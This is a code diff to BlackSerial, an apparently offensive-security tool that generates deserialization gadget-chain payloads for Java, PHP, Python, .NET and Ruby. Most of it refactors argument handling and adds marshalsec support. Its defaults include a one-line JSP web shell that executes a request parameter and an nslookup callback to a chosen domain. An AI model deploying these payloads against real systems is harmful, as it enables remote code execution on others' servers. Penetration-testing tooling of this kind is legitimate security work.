@@ -43,15 +43,17 @@ def setupLogging(no_color, verbose):
         logger.setLevel(logging.INFO)
 
 def createGenerator(serializer, args):
-    if serializer in ['phpggc', 'php']:
+    if serializer == 'phpggc':
         generator = PHPGGC(args.phpggc_path, args)
-    elif serializer in ['ysoserial', 'java']:
+    elif serializer == 'ysoserial':
         generator = YSOSerial(args.java_path, args.ysoserial_path, args)
-    elif serializer in ['pickle', 'python']:
+    elif serializer == 'marshalsec':
+        generator = Marshalsec(args.java_path, args.marshalsec_path, args)
+    elif serializer == 'pickle':
         generator = Pickle(args)
-    elif serializer in ['ysoserial.net', 'csharp']:
+    elif serializer == 'ysoserial.net':
         generator = YSOSerialNet(args.wine_path, args.ysoserial_net_path, args)
-    elif serializer in ['ruby', 'ruby-unsafe-deserialization']:
+    elif serializer == 'ruby-unsafe-deserialization':
         generator = Ruby(args.ruby_path, args.ruby_payload_path, args)
     else:
         logging.error(f"Unsupported serializer: {serializer}")
@@ -64,8 +66,18 @@ if __name__ == '__main__':
     title = "BlackSerial"
     description = "Blackbox Gadget Chain Payloads Generator (@darkpills)"
     default_system_command = 'nslookup %%chain_id%%.%%domain%%'
-    available_serializers = ['ysoserial', 'phpggc', 'pickle', 'ysoserial.net', 'ruby-unsafe-deserialization']
-    available_languages = ['java', 'php', 'python', 'csharp', 'ruby']
+    language_serializer_map = {
+        'java': ['ysoserial', 'marshalsec'],
+        'php': ['phpggc'],
+        'python': ['pickle'],
+        'csharp': ['ysoserial.net'],
+        'ruby': ['ruby-unsafe-deserialization'],
+    }
+    available_languages = list(language_serializer_map.keys())
+    available_serializers = []
+    for l in language_serializer_map:
+        available_serializers = available_serializers + language_serializer_map[l]
+
 
     parser = argparse.ArgumentParser(prog='BlackSerial', description=description, formatter_class=argparse.ArgumentDefaultsHelpFormatter)
 
@@ -74,7 +86,7 @@ if __name__ == '__main__':
     common_group = parser.add_argument_group('general options')
     common_group.add_argument('-o', '--output', help="Output payloads to file", default="payloads.txt")
     common_group.add_argument('-l', '--list', help="List payloads only", action="store_true")
-    common_group.add_argument('-s', '--serializer', help="Serializer or language", choices=available_serializers + available_languages + ['all'], default='phpggc')
+    common_group.add_argument('-s', '--serializer', help="Serializer or language", choices=available_serializers + available_languages + ['all'])
     common_group.add_argument('-f', '--unsafe', help="Unsafe gadget chains like File Delete", action="store_true")    
     common_group.add_argument('-n', '--no-color', help='No colored output', action="store_true")
     common_group.add_argument('-nc', '--no-cache', help='Do not use cache of list of chains', action="store_true")
@@ -111,6 +123,7 @@ if __name__ == '__main__':
     ysoserial_group = parser.add_argument_group('ysoserial')
     ysoserial_group.add_argument('--java-path', help="Full path to java bin", default="./bin/jre1.8.0_431/bin/java")
     ysoserial_group.add_argument('--ysoserial-path', help="Full path to ysoserial jar", default="./bin/ysoserial-all.jar")
+    ysoserial_group.add_argument('--marshalsec-path', help="Full path to marshalsec jar", default="./bin/marshalsec-all.jar")
     ysoserial_group.add_argument('--jsp-code', help="JSP Code or path to a file used for 'File Write' type chains (ex: exploit.jsp)", default="<% Runtime.getRuntime().exec(request.getParameter(\"c\")) %> %%chain_id%%")
 
     # python specific
@@ -156,7 +169,16 @@ if __name__ == '__main__':
         f.close()
 
     count = 0
-    serializers = available_serializers if args.serializer == 'all' else [args.serializer]
+    if args.serializer == None:
+        parser.print_help()
+        sys.exit(1)
+    elif args.serializer == 'all':
+        serializers = available_serializers
+    elif args.serializer in available_languages:
+        serializers = language_serializer_map[args.serializer]
+    else:
+        serializers = [args.serializer]
+        
     for serializer in serializers:
 
         logging.info(f"Using serializer {serializer}")
